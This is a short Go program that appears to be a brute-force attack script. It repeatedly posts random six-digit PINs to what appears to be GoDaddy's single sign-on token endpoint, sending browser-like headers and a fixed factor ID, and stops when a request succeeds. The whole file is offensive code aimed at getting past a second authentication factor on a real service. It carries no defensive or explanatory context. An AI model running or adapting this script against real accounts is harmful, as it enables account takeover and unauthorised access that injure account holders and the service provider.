package main

import (
  "fmt"
  "strings"
  "net/http"
  "io/ioutil"
  "math/rand"
  "time"
)

func request(pin int) (bool) {

  url := "https://sso.godaddy.com/v1/api/idp/my/token"
  pinS := fmt.Sprintf("%v", pin)
  for ; len(pinS) < 6; {
    pinS = "0" + pinS
  }
  fmt.Println(pinS)
  payload := strings.NewReader(fmt.Sprintf("{\"factor_id\":\"815cd80a-c8af-11e8-b0ed-fa163e30fd3c\",\"factor\":\"p_auth\",\"value\":\"%s\"}", pinS))

  req, _ := http.NewRequest("POST", url, payload)

  req.Header.Add("Pragma", "no-cache")
  req.Header.Add("Origin", "https://sso.godaddy.com")
  req.Header.Add("Accept-Language", "en-US,en;q=0.9")
  req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 OPR/55.0.2994.61")
  req.Header.Add("Content-Type", "application/json")
  req.Header.Add("Accept", "application/json")
  req.Header.Add("Cache-Control", "no-cache")
  req.Header.Add("Referer", "https://sso.godaddy.com/v1/login/levelup?plid=1^&app=account^&realm=idp^&path=^%^2Fproducts^&send_code=0^&send_code=0")
  req.Header.Add("Cookie", "GA1.2.476810106.158412213")
  req.Header.Add("Connection", "keep-alive")

  res, _ := http.DefaultClient.Do(req)

  defer res.Body.Close()
  body, _ := ioutil.ReadAll(res.Body)

  if res.StatusCode/100 == 2 {
    fmt.Println(string(body))
  }

  return res.StatusCode/100 == 2
}

func main() {
  rand.Seed(time.Now().UTC().UnixNano())
  for {
    num := rand.Intn(1000000)
    if request(num) {
      break
    }
  }
}
